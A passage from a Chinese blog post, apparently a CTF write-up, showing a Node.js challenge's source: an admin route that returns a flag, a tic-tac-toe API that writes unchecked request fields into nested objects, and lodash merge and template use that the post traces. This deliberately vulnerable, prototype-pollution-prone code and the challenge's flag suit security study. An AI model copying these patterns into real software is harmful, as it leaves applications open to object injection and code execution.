class="hljs-params">req, res</span>) =&gt;</span> &#123; <br>    <span class="hljs-comment">/*this is under development I guess ??*/</span><br>    <span class="hljs-built_in">console</span>.log(user.admintoken);<br>    <span class="hljs-keyword">if</span>(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken)&#123;<br>        res.send(<span class="hljs-string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&#x27;Forbidden&#x27;</span>);<br>    &#125;    <br>&#125;<br>)<br>app.post(<span class="hljs-string">&#x27;/api&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">var</span> client = req.body;<br>    <span class="hljs-keyword">var</span> winner = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (client.row &gt; <span class="hljs-number">3</span> || client.col &gt; <span class="hljs-number">3</span>)&#123;<br>        client.row %= <span class="hljs-number">3</span>;<br>        client.col %= <span class="hljs-number">3</span>;<br>    &#125;<br>    matrix[client.row][client.col] = client.data;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === matrix[i][<span class="hljs-number">1</span>] &amp;&amp; matrix[i][<span class="hljs-number">1</span>] === matrix[i][<span class="hljs-number">2</span>] )&#123;<br>            <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>                winner = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>                winner = <span class="hljs-number">2</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === matrix[<span class="hljs-number">1</span>][i] &amp;&amp; matrix[<span class="hljs-number">1</span>][i] === matrix[<span class="hljs-number">2</span>][i])&#123;<br>            <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>                winner = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>                winner = <span class="hljs-number">2</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp; matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp; matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>)&#123;<br>        winner = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp; matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp; matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>)&#123;<br>        winner = <span class="hljs-number">2</span>;<br>    &#125; <br><br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp; matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp; matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>)&#123;<br>        winner = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp; matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp; matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>)&#123;<br>        winner = <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (draw(matrix) &amp;&amp; winner === <span class="hljs-literal">null</span>)&#123;<br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-attr">winner</span>: <span class="hljs-number">0</span>&#125;))<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (winner !== <span class="hljs-literal">null</span>) &#123;<br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-attr">winner</span>: winner&#125;))<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-attr">winner</span>: -<span class="hljs-number">1</span>&#125;))<br>    &#125;<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;app listening on port 3000!&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>

<p>首先判断请求方式是POST，然后进行下一步，通过lodash.merge，将我们body中的数值给data,然后session中储存这个data，这里也大概跟了一下lodash.merge，其原理应该就是正常的merge。</p>
<p>赋值完了之后进行渲染index,在渲染的适合，会跳到下面这个函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123; <span class="hljs-comment">// define the template engine</span><br>    fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err))<br>  	<span class="hljs-keyword">let</span> compiled = lodash.template(content)<br>    <span class="hljs-keyword">let</span> rendered = compiled(&#123;...options&#125;)<br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered)<br>&#125;)<br>&#125;)<br></code></pre></td></tr></table></figure>


            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/cs/">cs</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/05/27/Docker/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Docker</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/">
                        <span class="hidden-mobile">vm证书bug</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://wo02ie.github.io" target="_blank" rel="nofollow noopener"><span>wo02ie</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
